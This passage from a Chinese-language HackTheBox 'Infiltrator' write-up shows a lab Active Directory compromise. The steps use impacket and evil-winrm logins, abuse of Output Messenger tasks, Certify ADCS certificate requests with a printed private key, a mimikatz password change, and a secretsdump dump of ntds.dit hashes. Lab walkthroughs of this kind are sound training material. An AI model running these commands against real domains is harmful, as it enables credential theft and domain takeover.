+<span class="line"><span>b14ca5898a4e4133bbce2ea2315a1916</span></span></code></pre>
+<p><img alt="image-20241119001347468.png" loading="lazy" decoding="async" width="1301" height="984" src="/_astro/image-20241119001347468.C5B1sQtX_Z2pUzC7.webp" srcset=""></p>
+<p>解密后还是很像 Base64，再来一次</p>
+<p><img alt="image-20241119001445616.png" loading="lazy" decoding="async" width="1292" height="1020" src="/_astro/image-20241119001445616.u6t1mzKq_Tpe47.webp" srcset=""></p>
+<p>这下拿到凭据了 <code>winrm_svc</code>:<code>WinRm@$svc^!^P</code>，尝试一下 kerberos 认证</p>
+<p><img alt="image-20241119001734218.png" loading="lazy" decoding="async" width="1592" height="1033" src="/_astro/image-20241119001734218.TaNzwP93_2mCBjr.webp" srcset=""></p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>impacket-getTGT 'infiltrator.htb'/'winrm_svc':'WinRm@$svc^!^P' -dc-ip 10.10.11.31</span></span>
+<span class="line"><span>KRB5CCNAME=winrm_svc.ccache evil-winrm -i 'dc01.infiltrator.htb' -r 'infiltrator.htb'</span></span></code></pre>
+<p>登录 winrm_svc，凭据没问题，现在再看一下 BloodHound 攻击路径</p>
+<p><img alt="image-20241119002223540.png" loading="lazy" decoding="async" width="917" height="260" src="/_astro/image-20241119002223540.BKIk8zKz_ZW6b7j.webp" srcset=""></p>
+<p>发现没什么特权，那么用这个账号再登录一下 Output Messenger 看看有没有其他提示信息</p>
+<p><img alt="image-20241119002532375.png" loading="lazy" decoding="async" width="1006" height="791" src="/_astro/image-20241119002532375.DWxh_yDp_nrQha.webp" srcset=""></p>
+<p>O.martinez 消息说，每天 9 点桌面会弹出窗口，然后除了 <code>Chiefs_Marketing_chat</code> 群组之外，没在其他地方分享过密码。</p>
+<h2 id="shell-as-omartinez">Shell as O.martinez</h2>
+<p><img alt="image-20241120100336499.png" loading="lazy" decoding="async" width="875" height="287" src="/_astro/image-20241120100336499.BOH45nCj_wXs0k.webp" srcset=""></p>
+<p>在笔记这里点击同步之后，发现了一个 API Key</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>lan_managment  api key 558R501T5I6024Y8JV3B7KOUN1A518GG</span></span></code></pre>
+<p>那么接下来尝试通过 API 去访问 <code>Chiefs_Marketing_chat</code> 群组消息</p>
+<blockquote>
+<p><a href="https://support.outputmessenger.com/chat-room-api/#Retrieving_all_chat_rooms">https://support.outputmessenger.com/chat-room-api/#Retrieving_all_chat_rooms</a></p>
+</blockquote>
+<p><img alt="image-20241120150214713.png" loading="lazy" decoding="async" width="1077" height="538" src="/_astro/image-20241120150214713.C28Yn_F0_Z21zXv4.webp" srcset=""></p>
+<p>并且可以看到是需要 roomkey 来查看群聊记录，那么先去看一下 winrm_svc 的本地缓存文件</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>impacket-getTGT 'infiltrator.htb'/'winrm_svc':'WinRm@$svc^!^P' -dc-ip 10.10.11.31</span></span>
+<span class="line"><span>KRB5CCNAME=winrm_svc.ccache evil-winrm -i 'dc01.infiltrator.htb' -r 'infiltrator.htb'</span></span></code></pre>
+<p><img alt="image-20241120150706901.png" loading="lazy" decoding="async" width="1100" height="401" src="/_astro/image-20241120150706901.Bna6VdZm_1QUBxl.webp" srcset=""></p>
+<p><img alt="image-20241120150848502.png" loading="lazy" decoding="async" width="1005" height="187" src="/_astro/image-20241120150848502.Ds6uADO6_12eRME.webp" srcset=""></p>
+<p>看到两个 sqlite 数据库，在其中找到了 roomkey</p>
+<p><img alt="image-20241120145942562.png" loading="lazy" decoding="async" width="982" height="436" src="/_astro/image-20241120145942562.D_Q_brJ3_23O8Am.webp" srcset=""></p>
+<p>找到 API 端口在 14125，那么构造请求，查看 <code>Chiefs_Marketing_chat</code> 群组消息</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>curl -H 'API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG' "http://127.0.0.1:14125/api/chatrooms/logs?roomkey=20240220014618@conference.com&amp;fromdate=2020/11/11&amp;todate=2024/11/20"</span></span></code></pre>
+<p><img alt="image-20241120151604488.png" loading="lazy" decoding="async" width="1448" height="666" src="/_astro/image-20241120151604488.7gRCLA3q_1UbUP7.webp" srcset=""></p>
+<p>发现 <code>O.martinez</code> 凭据 <code>m@rtinez@1996!</code></p>
+<p><img alt="image-20241120152445873.png" loading="lazy" decoding="async" width="1094" height="139" src="/_astro/image-20241120152445873.D3fsOFI7_Z29dSVU.webp" srcset=""></p>
+<p>这里不是域用户的密码，那么登录 outputmessenger 看一下，结合前面说的每天 9 点电脑会弹窗口</p>
+<p><img alt="image-20241120153920608.png" loading="lazy" decoding="async" width="732" height="793" src="/_astro/image-20241120153920608.xE5QV_sr_Z2iuI97.webp" srcset=""></p>
+<p>在日志这里发现一些定时任务</p>
+<blockquote>
+<p><a href="https://support.outputmessenger.com/reminder/">https://support.outputmessenger.com/reminder/</a></p>
+</blockquote>
+<p><img alt="image-20241120154717841.png" loading="lazy" decoding="async" width="1370" height="1035" src="/_astro/image-20241120154717841.BcpKS2VB_2i74aJ.webp" srcset=""></p>
+<p>在官方文档可以看到，这里是有执行命令的权限的，但是我这没有，怀疑是版本或者平台问题，那么安装一个 Windows 版本的客户端看一下</p>
+<p><img alt="image-20241120162651692.png" loading="lazy" decoding="async" width="970" height="563" src="/_astro/image-20241120162651692.Cl44rPtL_193FDN.webp" srcset=""></p>
+<p><img alt="image-20241120163651274.png" loading="lazy" decoding="async" width="1015" height="426" src="/_astro/image-20241120163651274.DzgbeJqc_Z2ksndg.webp" srcset=""></p>
+<p>这下正常了，但是选择执行文件的时候发现，只能选择本地的路径，那么需要在目标机器上创建一个一样的路径，创建完立刻注销，等待任务执行</p>
+<p><img alt="image-20241120164141311.png" loading="lazy" decoding="async" width="926" height="187" src="/_astro/image-20241120164141311.CCWcj_ws_14d5SH.webp" srcset=""></p>
+<p><img alt="image-20241120171435761.png" loading="lazy" decoding="async" width="1289" height="833" src="/_astro/image-20241120171435761.ClyBgLXn_1R42Q9.webp" srcset=""></p>
+<p><img alt="image-20241120171536160.png" loading="lazy" decoding="async" width="991" height="444" src="/_astro/image-20241120171536160.CoTJij9s_ZpLcu8.webp" srcset=""></p>
+<p>回来看一下，完全没问题，看一下这个用户的权限</p>
+<p><img alt="image-20241120173032073.png" loading="lazy" decoding="async" width="1181" height="683" src="/_astro/image-20241120173032073.CS7YjDWx_2asTH.webp" srcset=""></p>
+<p>只能通过远程桌面登录，但是目前没有密码，先看一下本地文件有没有聊天附件</p>
+<p><img alt="image-20241120171833030.png" loading="lazy" decoding="async" width="1254" height="558" src="/_astro/image-20241120171833030.CHj02vF4_ZYMmqK.webp" srcset=""></p>
+<p>发现一个流量捕获文件，本地分析一下，先过滤 HTTP 流量</p>
+<p><img alt="image-20241120172139690.png" loading="lazy" decoding="async" width="1317" height="411" src="/_astro/image-20241120172139690.CjRfeR1R_1C4DXT.webp" srcset=""></p>
+<p>发现请求了 BitLocker-backup.7z 文件，那么吧文件导出到本地</p>
+<p><img alt="image-20241120172814438.png" loading="lazy" decoding="async" width="925" height="781" src="/_astro/image-20241120172814438.CF1SJvwN_qpGBf.webp" srcset=""></p>
+<p>尝试解压需要密码，那么先用 <code>7z2john</code> 转成 Hash ，然后尝试爆破一下</p>
+<p><img alt="image-20241120175004669.png" loading="lazy" decoding="async" width="1168" height="347" src="/_astro/image-20241120175004669.q3SZROAV_qYCfp.webp" srcset=""></p>
+<p><img alt="image-20241120175127688.png" loading="lazy" decoding="async" width="1277" height="735" src="/_astro/image-20241120175127688.DlFC_jgP_1FLw73.webp" srcset=""></p>
+<p>得到了一个 HTML 文件，看上去是 BitLocker 的恢复密钥，那么现在需要想办法 RDP 登录</p>
+<p>有权限后，可以通过 ADCS 来获取 NT Hash</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Certify.exe find</span></span>
+<span class="line"><span>   _____          _   _  __              </span></span>
+<span class="line"><span>  / ____|        | | (_)/ _|             </span></span>
+<span class="line"><span> | |     ___ _ __| |_ _| |_ _   _        </span></span>
+<span class="line"><span> | |    / _ \ '__| __| |  _| | | |      </span></span>
+<span class="line"><span> | |___|  __/ |  | |_| | | | |_| |       </span></span>
+<span class="line"><span>  \_____\___|_|   \__|_|_|  \__, |   </span></span>
+<span class="line"><span>                             __/ |       </span></span>
+<span class="line"><span>                            |___./        </span></span>
+<span class="line"><span>  v1.1.0                               </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[*] Action: Find certificate templates</span></span>
+<span class="line"><span>[*] Using the search base 'CN=Configuration,DC=infiltrator,DC=htb'</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[*] Listing info about the Enterprise CA 'infiltrator-DC01-CA'</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    Enterprise CA Name            : infiltrator-DC01-CA</span></span>
+<span class="line"><span>    DNS Hostname                  : dc01.infiltrator.htb</span></span>
+<span class="line"><span>    FullName                      : dc01.infiltrator.htb\infiltrator-DC01-CA</span></span>
+<span class="line"><span>    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED</span></span>
+<span class="line"><span>    Cert SubjectName              : CN=infiltrator-DC01-CA, DC=infiltrator, DC=htb</span></span>
+<span class="line"><span>    Cert Thumbprint               : 04A961BA417C7829B307CFBD46B2FB486BFD86C1</span></span>
+<span class="line"><span>    Cert Serial                   : 724BCC4E21EA6681495514E0FD8A5149</span></span>
+<span class="line"><span>    Cert Start Date               : 12/7/2023 5:42:38 PM</span></span>
+<span class="line"><span>    Cert End Date                 : 8/4/2124 11:55:57 AM</span></span>
+<span class="line"><span>...</span></span></code></pre>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Certify.exe request /ca:dc01.infiltrator.htb\infiltrator-DC01-CA</span></span>
+<span class="line"><span>   _____          _   _  __              </span></span>
+<span class="line"><span>  / ____|        | | (_)/ _|             </span></span>
+<span class="line"><span> | |     ___ _ __| |_ _| |_ _   _        </span></span>
+<span class="line"><span> | |    / _ \ '__| __| |  _| | | |      </span></span>
+<span class="line"><span> | |___|  __/ |  | |_| | | | |_| |       </span></span>
+<span class="line"><span>  \_____\___|_|   \__|_|_|  \__, |   </span></span>
+<span class="line"><span>                             __/ |       </span></span>
+<span class="line"><span>                            |___./        </span></span>
+<span class="line"><span>  v1.1.0                               </span></span>
+<span class="line"><span>[*] Action: Request a Certificates</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[*] Current user context    : INFILTRATOR\o.martinez</span></span>
+<span class="line"><span>[*] No subject name specified, using current context as subject.</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[*] Template                : User</span></span>
+<span class="line"><span>[*] Subject                 : CN=O.martinez, CN=Users, DC=infiltrator, DC=htb</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[*] Certificate Authority   : dc01.infiltrator.htb\infiltrator-DC01-CA</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[+] Received Output [99 bytes]:</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[*] CA Response             : The certificate had been issued.</span></span>
+<span class="line"><span>[*] Request ID              : 8</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[+] Received Output [4220 bytes]:</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[*] cert.pem         :</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>-----BEGIN RSA PRIVATE KEY-----</span></span>
+<span class="line"><span>MIIEpAIBAAKCAQEAzHQiR/c/D+KqAIzhBvfY/iVmSUbUkmnqIPWpve8Dbs9FoV46</span></span>
+<span class="line"><span>MYxFDKwKhx4DxiOvpq7QRIV4poEWTfFcbXfujVP1iu1f5hQKRlkrwd+KT5s/Un+P</span></span>
+<span class="line"><span>crPHWkQ2j5OKJEd4SMX2Y3T/ekt/lfR2tgmscbs9TTKL5DLZKyoVbCgvgH82bVev</span></span>
+<span class="line"><span>c57s0q8IypTa36OGIGdoHl0R6TUQOKPr9E+2gv80lITogTnXnoF4Ni1wMU0SXxFz</span></span>
+<span class="line"><span>fQS1oC317QQiceELfwD/W/+VKvuVwIH+nbCcSBPgCP5slsmcc3dKiXUm2LmppIZi</span></span>
+<span class="line"><span>waiMxEbTDuoiWNGFetfh02seE3bM7LJr+Ve8hQIDAQABAoIBAHoKmKv8mlgRJQlP</span></span>
+<span class="line"><span>DsPqDk0mZfg3n4wGTQt/mOMXWSU79IRuiq4o3M7Do0UkVXxgsOj+ULOWOH6rb3T3</span></span>
+<span class="line"><span>LgTqIiuagmd7alMcg0Wa1NPVa+o48YN9QVNmnQj0ztzFZSBiyRonkPutSxLlHjOU</span></span>
+<span class="line"><span>yYfAHn+FFQKPuZFuCNQLOt5k3nYEaFqNCPPBO6+dqkei6NglwWbRWiM0Pz9bXEcO</span></span>
+<span class="line"><span>B1CguSOWYmO0/oHWJ11KWwjLNhxDj7z7pz9/IZ1Cxq501qUkiXa+8MnTYzQCMQ0H</span></span>
+<span class="line"><span>Yrl5bKIsC2P2aVM29PMlbmNQ3I77vrrIcfJX68tbsBcR3B3nS0LUgk2sk/oVHOyS</span></span>
+<span class="line"><span>zuga9cECgYEA3K6xX2i8TgKj0nA66O6t2ZwKUZ0GUEgyNy0qs8L8KByfiKaHXUao</span></span>
+<span class="line"><span>3fnFCRlxaVf19wmHd3BBXJbVFd3r7JV/1YWRgTt50x7V8s53SChJK0Er/UqNlVa4</span></span>
+<span class="line"><span>6ugJ5b6mh68kSEyaDlyWcRVGo0g8JBtkXk2XgQ/UD0TTPZeHeObo5m8CgYEA7SyN</span></span>
+<span class="line"><span>lGiiBaA84bfD5uABwctVpdCBWslbdJ5OF6OBWjq3KiLRPWOvLJyO1WMN6XusDCYI</span></span>
+<span class="line"><span>pekfRSqdOIZ8YNQjwk7RjPAEd/lD3NoCcVlDl8vL11TIftFJfnzpCdo0FIk6aGuq</span></span>
+<span class="line"><span>SH4ijwudRYlPh5zJ9w02tjAR+Ar+Sr2p4TN0ZksCgYAPTDDRe1IqWjZ+/PaodPsq</span></span>
+<span class="line"><span>LY3tkGQCpq6Mcp4WLfsK0MkiUODrT12fXZQSCGh7M/TB9jAk0GxHfdExnduf39En</span></span>
+<span class="line"><span>vQWUHspYHzgXh8ZvAxPnYrIo8cUUyBkzd3hQK8Ihf7uVI3I+cp6fIiluYjCBFEEF</span></span>
+<span class="line"><span>5H0PHkjF8jBugZWLhP46EwKBgQDsXBo8bIoLUUVbLOfujg8yMpGITeKbt0+NSLZK</span></span>
+<span class="line"><span>mIewhBNFyqz7oPxSWTN/NNgId1deRAkaTtj69Rz52Azb8o4wdpwe+JN7fM5Eqn8E</span></span>
+<span class="line"><span>txDFljPuxG+K8sdrZtBXIT4FuTycE6//zrRiGhEB23WGkJo1utVrezxtFYeWtK03</span></span>
+<span class="line"><span>4S9/QQKBgQDMsxuIbQHyH4PHKhJ17ZJYM80rOLtF3Jq0bwrieucnG17uy/336TIz</span></span>
+<span class="line"><span>WQhfzLS+eRLUzVCV7tYBd38JyJKTaTfbZBTYs5fTvpNtma1V8gJujJOUJgdk8iC5</span></span>
+<span class="line"><span>MOaExu0eBiviukelGLDD/so78meFvIvjJkUA2PB9YBNx8y2S+1xUKg==</span></span>
+<span class="line"><span>-----END RSA PRIVATE KEY-----</span></span>
+<span class="line"><span>-----BEGIN CERTIFICATE-----</span></span>
+<span class="line"><span>MIIGgTCCBWmgAwIBAgITaQAAAAig71PWX2BvHQABAAAACDANBgkqhkiG9w0BAQsF</span></span>
+<span class="line"><span>ADBQMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLaW5maWx0</span></span>
+<span class="line"><span>cmF0b3IxHDAaBgNVBAMTE2luZmlsdHJhdG9yLURDMDEtQ0EwHhcNMjQxMTIxMDEw</span></span>
+<span class="line"><span>NzIxWhcNMjUxMTIxMDEwNzIxWjCBgDETMBEGCgmSJomT8ixkARkWA2h0YjEbMBkG</span></span>
+<span class="line"><span>CgmSJomT8ixkARkWC2luZmlsdHJhdG9yMQ4wDAYDVQQDEwVVc2VyczETMBEGA1UE</span></span>
+<span class="line"><span>AxMKTy5tYXJ0aW5lejEnMCUGCSqGSIb3DQEJARYYbWFydGluZXpAaW5maWx0cmF0</span></span>
+<span class="line"><span>b3IuaHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzHQiR/c/D+Kq</span></span>
+<span class="line"><span>AIzhBvfY/iVmSUbUkmnqIPWpve8Dbs9FoV46MYxFDKwKhx4DxiOvpq7QRIV4poEW</span></span>
+<span class="line"><span>TfFcbXfujVP1iu1f5hQKRlkrwd+KT5s/Un+PcrPHWkQ2j5OKJEd4SMX2Y3T/ekt/</span></span>
+<span class="line"><span>lfR2tgmscbs9TTKL5DLZKyoVbCgvgH82bVevc57s0q8IypTa36OGIGdoHl0R6TUQ</span></span>
+<span class="line"><span>OKPr9E+2gv80lITogTnXnoF4Ni1wMU0SXxFzfQS1oC317QQiceELfwD/W/+VKvuV</span></span>
+<span class="line"><span>wIH+nbCcSBPgCP5slsmcc3dKiXUm2LmppIZiwaiMxEbTDuoiWNGFetfh02seE3bM</span></span>
+<span class="line"><span>7LJr+Ve8hQIDAQABo4IDITCCAx0wFwYJKwYBBAGCNxQCBAoeCABVAHMAZQByMCkG</span></span>
+<span class="line"><span>A1UdJQQiMCAGCisGAQQBgjcKAwQGCCsGAQUFBwMEBggrBgEFBQcDAjAOBgNVHQ8B</span></span>
+<span class="line"><span>Af8EBAMCBaAwRAYJKoZIhvcNAQkPBDcwNTAOBggqhkiG9w0DAgICAIAwDgYIKoZI</span></span>
+<span class="line"><span>hvcNAwQCAgCAMAcGBSsOAwIHMAoGCCqGSIb3DQMHMB0GA1UdDgQWBBQ/HY16qwj0</span></span>
+<span class="line"><span>HNgSB+WtWl9erwLKmjAfBgNVHSMEGDAWgBRb6/nmmoCr6kHCUO3HEqDM/mdm8zCB</span></span>
+<span class="line"><span>0gYDVR0fBIHKMIHHMIHEoIHBoIG+hoG7bGRhcDovLy9DTj1pbmZpbHRyYXRvci1E</span></span>
+<span class="line"><span>QzAxLUNBLENOPWRjMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz</span></span>
+<span class="line"><span>LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aW5maWx0cmF0b3IsREM9</span></span>
+<span class="line"><span>aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1j</span></span>
+<span class="line"><span>UkxEaXN0cmlidXRpb25Qb2ludDCByQYIKwYBBQUHAQEEgbwwgbkwgbYGCCsGAQUF</span></span>
+<span class="line"><span>BzAChoGpbGRhcDovLy9DTj1pbmZpbHRyYXRvci1EQzAxLUNBLENOPUFJQSxDTj1Q</span></span>
+<span class="line"><span>dWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0</span></span>
+<span class="line"><span>aW9uLERDPWluZmlsdHJhdG9yLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2Jq</span></span>
+<span class="line"><span>ZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTBPBgNVHREESDBGoCoGCisG</span></span>
+<span class="line"><span>AQQBgjcUAgOgHAwaTy5tYXJ0aW5lekBpbmZpbHRyYXRvci5odGKBGG1hcnRpbmV6</span></span>
+<span class="line"><span>QGluZmlsdHJhdG9yLmh0YjBPBgkrBgEEAYI3GQIEQjBAoD4GCisGAQQBgjcZAgGg</span></span>
+<span class="line"><span>MAQuUy0xLTUtMjEtMjYwNjA5ODgyOC0zNzM0NzQxNTE2LTM2MjU0MDY4MDItMTEw</span></span>
+<span class="line"><span>NjANBgkqhkiG9w0BAQsFAAOCAQEAeBvUjSr8MDsR5HnjQ2u8lYbf5tyfPIeNjvyh</span></span>
+<span class="line"><span>CK+DK8yGZAaY4nVKWKqD5KN6sji8Vj9fbW08xfS9x6UpHIQx8gM8wZ8/ESxmKu6d</span></span>
+<span class="line"><span>Brf7GKlH1EHRDxxNHMnP6aO3GXKViz2F50NGvrT8TBgeGYxmtbI7ZWu267xw9lXu</span></span>
+<span class="line"><span>QTypwzbErS76uBtLQ4dqi3+qI9gv9YluyoO+111VAILGXirtv+SXlfCiIWSO8cCL</span></span>
+<span class="line"><span>zOBd6nYwhPJ0uEBpwA4VMAfuPKNGr0APyWZGV+9bEmX4rP5Vbb/C/2/ZVxLfatGe</span></span>
+<span class="line"><span>Wqvn6mQj9yxM6zeGovjq0IjhIgPJWOrGoky00QUQ68m+O+9n6g==</span></span>
+<span class="line"><span>-----END CERTIFICATE-----</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx</span></span>
+<span class="line"><span>[+] Received Output [43 bytes]:</span></span>
+<span class="line"><span>Certify completed in 00:00:15.6574722</span></span></code></pre>
+<p>使用提示的命令生成 pfx 文件，密码为空，然后就可以得到 NT Hash 了</p>
+<p><img alt="image-20241121093318391.png" loading="lazy" decoding="async" width="1400" height="455" src="/_astro/image-20241121093318391.CxeajZkL_Z10OnIz.webp" srcset=""></p>
+<p>拿到 <code>O.Martinez</code> 的 NT Hash <code>daf40bbfbf00619b01402e5f3acd40a9</code> 先尝试登录一下</p>
+<p><img alt="image-20241121094006429.png" loading="lazy" decoding="async" width="1676" height="156" src="/_astro/image-20241121094006429.D3RNTxai_Zev6Lv.webp" srcset=""></p>
+<p>提示是已经有访问权限了，PTH 登录桌面</p>
+<p><img alt="image-20241121100416423.png" loading="lazy" decoding="async" width="1030" height="1216" src="/_astro/image-20241121100416423.D0raL74K_kFcBi.webp" srcset=""></p>
+<p>RDP 被限制空密码登录，需要修改注册表去关闭 <code>LimitBlankPasswordUse</code>​ 和开启 <code>DisableRestrictedAdmin</code>​ 才能空密码 PTH，所以想到用 <code>mimikatz</code> 修改密码</p>
+<blockquote>
+<p><a href="https://medium.com/@jakemcgreevy/pass-the-hash-pth-with-rdp-80595fb38bef">https://medium.com/@jakemcgreevy/pass-the-hash-pth-with-rdp-80595fb38bef</a>
+<a href="https://manesec.github.io/2024/09/03/2024-htb-machine/35-Infiltrator/#Attack-ADCS-to-change-password">https://manesec.github.io/2024/09/03/2024-htb-machine/35-Infiltrator/#Attack-ADCS-to-change-password</a></p>
+</blockquote>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>mimikatz.exe "lsadump::changentlm /server:dc01.infiltrator.htb /user:o.martinez /old:daf40bbfbf00619b01402e5f3acd40a9 /newpassword:Admin@123123" "exit"</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08</span></span>
+<span class="line"><span> .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)</span></span>
+<span class="line"><span> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span>
+<span class="line"><span> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span>
+<span class="line"><span> '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span></span>
+<span class="line"><span>  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>mimikatz(commandline) # lsadump::changentlm /server:dc01.infiltrator.htb /user:o.martinez /old:daf40bbfbf00619b01402e5f3acd40a9 /newpassword:Admin@123123</span></span>
+<span class="line"><span>OLD NTLM     : daf40bbfbf00619b01402e5f3acd40a9</span></span>
+<span class="line"><span>NEW NTLM     : bedf6b880b93ea30a194162f7554a81d</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Target server: dc01.infiltrator.htb</span></span>
+<span class="line"><span>Target user  : o.martinez</span></span>
+<span class="line"><span>Domain name  : INFILTRATOR</span></span>
+<span class="line"><span>Domain SID   : S-1-5-21-2606098828-3734741516-3625406802</span></span>
+<span class="line"><span>User RID     : 1106</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>&gt;&gt; Change password is a success!</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>mimikatz(commandline) # exit</span></span>
+<span class="line"><span>Bye!</span></span></code></pre>
+<p><img alt="image-20241121103650908.png" loading="lazy" decoding="async" width="1126" height="635" src="/_astro/image-20241121103650908.BEomV66W_Z18YCqb.webp" srcset=""></p>
+<p>发现 BitLocker 加密的磁盘，使用恢复密钥恢复一下，然后把里面的文件夹先复制到桌面，翻一下</p>
+<p><img alt="image-20241121104216401.png" loading="lazy" decoding="async" width="1261" height="421" src="/_astro/image-20241121104216401.DLcCC0qQ_Z1XjDln.webp" srcset=""></p>
+<p><img alt="image-20241121104710026.png" loading="lazy" decoding="async" width="727" height="205" src="/_astro/image-20241121104710026.DH1hTE1Y_POqhb.webp" srcset=""></p>
+<p>找到一个备份文件，解压后发现一些本地凭据存储的相关文件，导出一下</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local</span></span>
+<span class="line"><span>---</span></span>
+<span class="line"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[*] Target system bootKey: 0xd7e7d8797c1ccd58d95e4fb25cb7bdd4</span></span>
+<span class="line"><span>[*] Dumping cached domain logon information (domain/username:hash)</span></span>
+<span class="line"><span>[*] Dumping LSA Secrets</span></span>
+<span class="line"><span>[*] $MACHINE.ACC </span></span>
+<span class="line"><span>$MACHINE.ACC:plain_password_hex:4b90048ad6028aae98f66484009266d4efa571d48a8aa6b771d69d20aba16ddb7e0a0ffe9378a1ac7b31a812f0760fe2a8ce66ff6a0ff772155a29baa59b4407a95a920d0904cba6f8b19b6393f1551a476f991bbedaa66880e60611482a81b31b34c55c77d0e0d1792e3b18cdc9d39e0b776e7ef082399b096aaa2e8d93eb1f0340fd5f6e138da2580d1f581ff9426dce99a901a1bf88ad3f19a5bc4ce8ff17fdbb0a04bb29f13dc46177a6d8cd61bf91f8342e33b5362daecbb888df22ce467aa9f45a9dc69b03d116eeac89857d17f3f44f4abc34165b296a42b3b3ff5ab26401b5734fab6ad142d7882715927e45</span></span>
+<span class="line"><span>$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:fe4767309896203c581b9fc3c5e23b00</span></span>
+<span class="line"><span>[*] DefaultPassword </span></span>
+<span class="line"><span>(Unknown User):ROOT#123</span></span>
+<span class="line"><span>[*] DPAPI_SYSTEM </span></span>
+<span class="line"><span>dpapi_machinekey:0x81f5247051ff9535ad8299f0efd531ff3a5cb688</span></span>
+<span class="line"><span>dpapi_userkey:0x79d13d91a01f6c38437c526396febaf8c1bc6909</span></span>
+<span class="line"><span>[*] NL$KM </span></span>
+<span class="line"><span> 0000   2E 8A EC D8 ED 12 C6 ED  26 8E B0 9B DF DA 42 B7   ........&amp;.....B.</span></span>
+<span class="line"><span> 0010   49 DA B0 07 05 EE EA 07  05 02 04 0E AD F7 13 C2   I...............</span></span>
+<span class="line"><span> 0020   6C 6D 8E 19 1A B0 51 41  7C 7D 73 9E 99 BA CD B1   lm....QA|}s.....</span></span>
+<span class="line"><span> 0030   B7 7A 3E 0F 59 50 1C AD  8F 14 62 84 3F AC A9 92   .z&gt;.YP....b.?...</span></span>
+<span class="line"><span>NL$KM:2e8aecd8ed12c6ed268eb09bdfda42b749dab00705eeea070502040eadf713c26c6d8e191ab051417c7d739e99bacdb1b77a3e0f59501cad8f1462843faca992</span></span>
+<span class="line"><span>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span></span>
+<span class="line"><span>[*] Searching for pekList, be patient</span></span>
+<span class="line"><span>[*] PEK # 0 found and decrypted: d27644ab3070f72ec264fcb413d75299</span></span>
+<span class="line"><span>[*] Reading and decrypting hashes from res/Active Directory/ntds.dit </span></span>
+<span class="line"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:7bf62b9c45112ffdadb7b6b4b9299dd2:::</span></span>
